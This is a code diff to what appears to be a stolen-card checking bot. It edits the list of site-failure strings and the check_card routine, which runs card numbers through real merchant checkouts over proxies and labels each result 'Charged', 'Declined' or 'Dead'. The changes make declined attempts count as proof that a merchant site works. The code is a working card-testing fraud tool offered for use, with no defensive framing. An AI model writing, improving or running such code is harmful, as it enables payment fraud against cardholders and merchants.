@@ -862,32 +862,47 @@ async def send_log_to_channel(response_msg, gateway, price, username, user_id):
     except Exception as e:
         print(f"Error sending log to PVT channel: {e}")
 
-# ========== DEAD INDICATORS ==========
+# ========== DEAD INDICATORS (SITE-LEVEL ERRORS ONLY) ==========
+# CRITICAL: Only site-level failures that prevent checkout, NOT card declines
+# Card declines (DECLINED, INSUFFICIENT_FUNDS, etc.) prove the site is WORKING
 _DEAD_INDICATORS = (
+    # Site configuration errors
     'receipt id is empty', 'handle is empty', 'product id is empty',
     'tax amount is empty', 'payment method identifier is empty',
-    'invalid url', 'error in 1st req', 'error in 1 req',
-    'cloudflare', 'connection failed', 'timed out',
-    'access denied', 'tlsv1 alert', 'ssl routines',
-    'could not resolve', 'domain name not found',
-    'name or service not known', 'openssl ssl_connect',
-    'empty reply from server', 'httperror504', 'http error',
-    'timeout', 'unreachable', 'ssl error',
-    '502', '503', '504', 'bad gateway', 'service unavailable',
-    'gateway timeout', 'network error', 'connection reset',
+    'invalid url', 'url rejected', 'malformed input',
+
+    # Connection/network failures
+    'cloudflare', 'connection failed', 'timed out', 'timeout',
+    'tlsv1 alert', 'ssl routines', 'ssl error', 'openssl ssl_connect',
+    'could not resolve', 'domain name not found', 'name or service not known',
+    'empty reply from server', 'network error', 'connection reset',
+    'unreachable', 'access denied',
+
+    # HTTP errors
+    'httperror504', 'http error', 'http 404',
+    '502', '503', '504', 'bad gateway', 'service unavailable', 'gateway timeout',
+    '429', 'too many requests', 'rate limit', 'rate limited',
+
+    # API/checkout flow errors
+    'error in 1st req', 'error in 1 req',
     'failed to detect product', 'failed to create checkout',
     'failed to tokenize card', 'failed to get proposal data',
-    'submit rejected', 'submit rejected:', 'handle error', 'http 404',
-    'delivery_delivery_line_detail_changed', 'delivery_address2_required',
-    'url rejected', 'malformed input', 'amount_too_small', 'amount too small',
-    'site dead', 'captcha_required', 'captcha required', 'site errors', 'failed',
+    'submit rejected', 'handle error',
     'all products sold out', 'no_session_token', 'tokenize_fail',
     'generic_error', 'empty_submit_response',
-    # NEW: additional false-positive indicators
+
+    # Price/product issues
+    'no_product_in_price_range', 'zero_dollar_order', 'zero dollar', 'price is zero',
+    'amount_too_small', 'amount too small',
+
+    # Site dead indicators
+    'site dead', 'site errors', 'site error',
+    'captcha_required', 'captcha required',
     'not found', 'checkout is not valid', 'checkout not valid',
     'test mode only', 'test mode', 'empty body', 'empty response',
-    '429', 'too many requests', 'rate limit', 'rate limited',
-    'zero_dollar_order', 'zero dollar', 'price is zero',
+
+    # Delivery/address errors (site config issues)
+    'delivery_delivery_line_detail_changed', 'delivery_address2_required',
 )
 
 def extract_cc(text):
@@ -1013,10 +1028,19 @@ async def check_card(card, site, proxy, use_variant_cache=True):
                 'refund_credit': True,
             }
 
+        # CRITICAL SITE TESTING LOGIC:
+        # api_status=True means site is WORKING (even if card declined)
+        # This includes: Charged, Approved, Declined, Insufficient Funds, etc.
         if api_status is True or api_status in ('True', 'true'):
             if 'charged' in response_lower:
                 return {
                     'status': 'Charged', 'message': response_msg, 'card': card,
+                    'site': site, 'gateway': gateway, 'price': price,
+                }
+            elif any(x in response_lower for x in ['declined', 'insufficient', 'expired', 'invalid']):
+                # Card declined but site is working - this is a successful site test
+                return {
+                    'status': 'Declined', 'message': response_msg, 'card': card,
                     'site': site, 'gateway': gateway, 'price': price,
                 }
             else:
@@ -1025,6 +1049,7 @@ async def check_card(card, site, proxy, use_variant_cache=True):
                     'site': site, 'gateway': gateway, 'price': price,
                 }
         else:
+            # api_status=False means site error
             return {
                 'status': 'Dead', 'message': response_msg, 'card': card,
                 'site': site, 'gateway': gateway, 'price': price,
